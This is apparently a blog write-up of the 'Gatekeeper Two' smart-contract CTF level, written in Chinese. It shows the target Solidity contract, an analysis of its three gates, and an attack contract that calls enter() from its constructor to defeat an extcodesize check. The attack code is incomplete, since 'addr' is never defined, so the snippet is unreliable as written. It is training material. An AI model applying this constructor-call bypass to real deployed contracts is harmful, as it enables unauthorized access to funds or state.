---
layout: post
title: Gatekeeper two
---

# Gatekeeper two
assembly的用法等
```solidity
pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### 代码分析
1. gateOne：和Gatekeeper one一样
2. gateTwo：extcodesize(caller)可以返回调用者地址的code size大小；gateTwo需要调用者地址没有存储代码，这
看起来似乎和gateOne有点矛盾，但在攻击合约的构造函数中调用该合约时，因攻击合约交易还未完成，没有打包进块，所以
excodesize返回的值为0；
3. gateThree：保证可以满足公式，因为`keccak256(msg.sender)`中对msg.sender进行了hash计算，又因为gateOne
和gateTwo，msg.sender为攻击合约，且攻击合约的地址不能确定（因为调用必须在构造函数中进行），所以需要将该逻辑在
构造函数中执行一遍

### 攻击合约
```solidity
pragma solidity ^0.4.18;

contract Test {
    function Test() {
        uint64 a = keccak256(this);
        uint64 b = uint64(0) - 1;
        uint64 c = b - a; // c ^ a = b // b = 0xffffffffffffffff
        send(bytes8(c));
    }
    
    function send(bytes8 key) {
        addr.call(bytes4(keccak256("enter(bytes8)")), key);
    }
}
```

### 攻击方法
1. 部署攻击合约，合约构造时自动攻击。